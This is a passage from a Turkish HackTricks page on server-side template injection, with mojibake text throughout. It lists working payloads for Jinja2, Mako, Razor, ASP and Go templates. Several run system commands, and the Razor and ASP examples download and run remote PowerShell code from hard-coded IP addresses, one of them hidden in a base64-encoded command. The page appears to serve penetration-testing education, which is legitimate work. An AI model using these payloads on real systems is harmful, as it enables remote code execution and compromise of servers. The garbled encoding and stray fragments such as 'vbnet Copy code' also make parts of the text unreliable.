Jinja2, gÃ¼Ã§lÃ¼ bir ÅŸablon motoru olmasÄ±nÄ±n yanÄ± sÄ±ra, bazÄ± gÃ¼venlik risklerini de beraberinde getirebilir. Ã–zellikle, sunucu tarafÄ± ÅŸablon enjeksiyonu (Server-Side Template Injection - SSTI) saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olabilir. Bu saldÄ±rÄ±lar, kÃ¶tÃ¼ niyetli kullanÄ±cÄ±larÄ±n ÅŸablon motorunun iÃ§inde Python kodu Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r ve ciddi gÃ¼venlik aÃ§Ä±klarÄ±na yol aÃ§abilir.

SSTI saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in, giriÅŸ doÄŸrulama ve veri doÄŸrulama gibi gÃ¼venlik Ã¶nlemleri almak Ã¶nemlidir. AyrÄ±ca, Jinja2'nin gÃ¼venlik ayarlarÄ±nÄ± yapÄ±landÄ±rarak potansiyel riskleri azaltabilirsiniz.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**`__builtins__`'a baÄŸlÄ± olmayan RCE**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):

Bu saldÄ±rÄ±, Jinja ÅŸablonlarÄ±nda gerÃ§ekleÅŸen bir gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan yararlanÄ±r. Jinja, Python tabanlÄ± bir ÅŸablon motorudur ve birÃ§ok web uygulamasÄ±nda kullanÄ±lÄ±r. Bu saldÄ±rÄ±da, saldÄ±rgan, sunucu tarafÄ± ÅŸablon enjeksiyonu (SSTI) kullanarak Python kodunu yÃ¼rÃ¼tebilir.

Bu saldÄ±rÄ±, `__builtins__` deÄŸiÅŸkenine baÄŸÄ±mlÄ± deÄŸildir. Bu, hedef sistemin `__builtins__` deÄŸiÅŸkenini sÄ±nÄ±rlayan veya devre dÄ±ÅŸÄ± bÄ±rakan Ã¶nlemler alsa bile saldÄ±rganÄ±n hala RCE (Uzaktan Kod YÃ¼rÃ¼tme) gerÃ§ekleÅŸtirebileceÄŸi anlamÄ±na gelir.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rgan, hedef uygulamada kullanÄ±lan Jinja ÅŸablonlarÄ±nda gÃ¼venlik aÃ§Ä±ÄŸÄ± bulmalÄ± ve bu aÃ§Ä±ÄŸÄ± kullanarak Python kodunu enjekte etmelidir. Bu, saldÄ±rganÄ±n hedef sistemin kontrolÃ¼nÃ¼ ele geÃ§irmesine ve istediÄŸi iÅŸlemleri gerÃ§ekleÅŸtirmesine olanak tanÄ±r.

Bu saldÄ±rÄ±yÄ± Ã¶nlemek iÃ§in, geliÅŸtiricilerin gÃ¼venli kodlama uygulamalarÄ±nÄ± takip etmeleri ve kullanÄ±lan ÅŸablon motorunun gÃ¼ncel ve gÃ¼venli bir sÃ¼rÃ¼mÃ¼nÃ¼ kullanmalarÄ± Ã¶nemlidir. AyrÄ±ca, kullanÄ±cÄ± giriÅŸlerini doÄŸru bir ÅŸekilde doÄŸrulamak ve filtrelemek de Ã¶nemlidir.
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Jinja'nÄ±n nasÄ±l kÃ¶tÃ¼ye kullanÄ±lacaÄŸÄ± hakkÄ±nda daha fazla ayrÄ±ntÄ±**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

DiÄŸer payloadlar iÃ§in [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**Daha fazla bilgi**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= BaÅŸarÄ±lÄ±`
* `@() <= BaÅŸarÄ±lÄ±`
* `@("{{kod}}") <= BaÅŸarÄ±lÄ±`
* `@ <= BaÅŸarÄ±lÄ±`
* `@{} <= HATA!`
* `@{ <= HATA!`
* `@(1+2)`
* `@( //C#Kod )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA`Ow==");`

.NET `System.Diagnostics.Process.Start` yÃ¶ntemi, sunucuda herhangi bir iÅŸlemi baÅŸlatmak ve bÃ¶ylece bir webshell oluÅŸturmak iÃ§in kullanÄ±labilir. [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp) adresinde zafiyetli bir web uygulama Ã¶rneÄŸi bulabilirsiniz.

**Daha fazla bilgi**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = HiÃ§bir ÅŸey
* `<%= response.write(date()) %>` = \<Tarih>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Daha Fazla Bilgi**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Perl olsa da, Ruby'deki ERB gibi etiketler kullanÄ±r.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Hata`
```
<%= perl code %>
<% perl code %>
```
### GO'da SSTI

Go'nun ÅŸablon motorunda kullanÄ±mÄ±n doÄŸrulanmasÄ± belirli payloadlarla yapÄ±labilir:

* `{{ . }}`: Veri yapÄ±sÄ±nÄ± ortaya Ã§Ä±karÄ±r. Ã–rneÄŸin, `Password` Ã¶zelliÄŸine sahip bir nesne geÃ§irilirse, `{{ .Password }}` bunu aÃ§Ä±ÄŸa Ã§Ä±karabilir.
* `{{printf "%s" "ssti" }}`: "ssti" dizesini gÃ¶rÃ¼ntÃ¼lemesi beklenir.
* `{{html "ssti"}}`, `{{js "ssti"}}`: Bu payloadlar "html" veya "js" eklemeksizin "ssti" dÃ¶ndÃ¼rmelidir. Daha fazla yÃ¶nerge Go belgelerinde [burada](https://golang.org/pkg/text/template) keÅŸfedilebilir.

**XSS SÃ¶mÃ¼rÃ¼sÃ¼**

`text/template` paketi ile XSS doÄŸrudan payload'Ä±n doÄŸrudan eklenmesiyle kolayca gerÃ§ekleÅŸtirilebilir. Bununla birlikte, `html/template` paketi yanÄ±tÄ± kodlamak iÃ§in kullanÄ±r (Ã¶rneÄŸin, `{{"<script>alert(1)</script>"}}` ifadesi `&lt;script&gt;alert(1)&lt;/script&gt;` sonucunu verir). Bununla birlikte, Go'da ÅŸablon tanÄ±mÄ± ve Ã§aÄŸrÄ±sÄ± bu kodlamayÄ± atlayabilir:
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}

vbnet
Copy code

**RCE SÃ¶mÃ¼rÃ¼sÃ¼**

RCE sÃ¶mÃ¼rÃ¼sÃ¼, `html/template` ve `text/template` arasÄ±nda Ã¶nemli farklÄ±lÄ±klar gÃ¶sterir. `text/template` modÃ¼lÃ¼, herhangi bir genel iÅŸlevi doÄŸrudan Ã§aÄŸÄ±rmaya izin verir ("call" deÄŸerini kullanarak), bu `html/template` iÃ§in izin verilmez. Bu modÃ¼llerle ilgili belgelere [buradan html/template iÃ§in](https://golang.org/pkg/html/template/) ve [buradan text/template iÃ§in](https://golang.org/pkg/text/template/) eriÅŸilebilir.

Go'da SSTI aracÄ±lÄ±ÄŸÄ±yla RCE, nesne yÃ¶ntemleri Ã§aÄŸrÄ±labilir. Ã–rneÄŸin, saÄŸlanan nesnenin komutlarÄ± yÃ¼rÃ¼ten bir `System` yÃ¶ntemi varsa, bunu `{{ .System "ls" }}` ÅŸeklinde sÃ¶mÃ¼rÃ¼lebilir. Bu sÃ¶mÃ¼rÃ¼yÃ¼ gerÃ§ekleÅŸtirmek iÃ§in genellikle kaynak koduna eriÅŸim gereklidir, verilen Ã¶rnekte olduÄŸu gibi:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**Daha fazla bilgi**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Daha Fazla SaldÄ±rÄ±

Daha fazla saldÄ±rÄ± iÃ§in [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) adresini kontrol edin. AyrÄ±ca ilginÃ§ etiket bilgilerini [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI) adresinde bulabilirsiniz.

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Ä°lgili YardÄ±m

FaydalÄ± olabileceÄŸini dÃ¼ÅŸÃ¼nÃ¼yorsanÄ±z, okuyun:

* [Flask hileleri](../../network-services-pentesting/pentesting-web/flask.md)
* [Python sihirli fonksiyonlarÄ±](broken-reference/)

## AraÃ§lar

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## Brute-Force Tespit Listesi

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Pratik ve Referanslar

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/), **Ä°spanya**'daki en Ã¶nemli siber gÃ¼venlik etkinliÄŸi ve **Avrupa**'nÄ±n en Ã¶nemli etkinliklerinden biridir. Teknik bilginin yayÄ±lmasÄ±nÄ± amaÃ§layan bu kongre, her disiplindeki teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da** takip edin.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
